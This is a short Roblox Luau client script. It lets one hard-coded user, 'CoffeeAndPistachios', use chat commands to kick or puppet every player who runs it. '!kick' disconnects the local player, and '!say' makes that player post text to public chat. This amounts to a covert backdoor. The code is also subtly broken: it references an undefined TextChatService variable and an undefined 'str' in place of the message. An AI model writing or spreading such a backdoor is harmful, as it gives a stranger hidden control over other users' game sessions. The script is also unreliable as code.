local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

Players.PlayerAdded:Connect(@native function(Player)
    Player.Chatted:Connect(@native function(Message)
        if (Message == "!kick") then
            if (Player.Name == "CoffeeAndPistachios") then
                LocalPlayer:Kick("kicked cuz yes")
            end
        elseif Message:sub(1, 5) == "!say " then
            local ToSay = Message:sub(6)
            if (Player.Name == "CoffeeAndPistachios") then
                if (TextChatService.ChatVersion ~= Enum.ChatVersion.LegacyChatService) then
		            game.TextChatService.TextChannels.RBXGeneral:SendAsync(ToSay)
	            else
		            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
                end
            end
        end
    end)
end)